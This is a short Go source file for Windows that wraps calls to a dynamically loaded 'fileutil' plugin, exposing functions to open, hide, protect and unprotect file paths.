//go:build windows

package sysutil

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func fileutil(fn func(*loader.Plugin)) {
	p, err := loader.Load("fileutil")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func OpenFile(path string) bool {
	var ok bool
	fileutil(func(p *loader.Plugin) {
		n, _ := p.Call("open_file", uintptr(unsafe.Pointer(loader.BytePtr(path))))
		ok = int(n) == 1
	})
	return ok
}

func HidePath(path string) {
	fileutil(func(p *loader.Plugin) {
		p.Call("hide_path", uintptr(unsafe.Pointer(loader.BytePtr(path))))
	})
}

func ProtectPath(path string) bool {
	var ok bool
	fileutil(func(p *loader.Plugin) {
		n, _ := p.Call("protect_path", uintptr(unsafe.Pointer(loader.BytePtr(path))))
		ok = int(n) == 1
	})
	return ok
}

func UnprotectPath(path string) bool {
	var ok bool
	fileutil(func(p *loader.Plugin) {
		n, _ := p.Call("unprotect_path", uintptr(unsafe.Pointer(loader.BytePtr(path))))
		ok = int(n) == 1
	})
	return ok
}
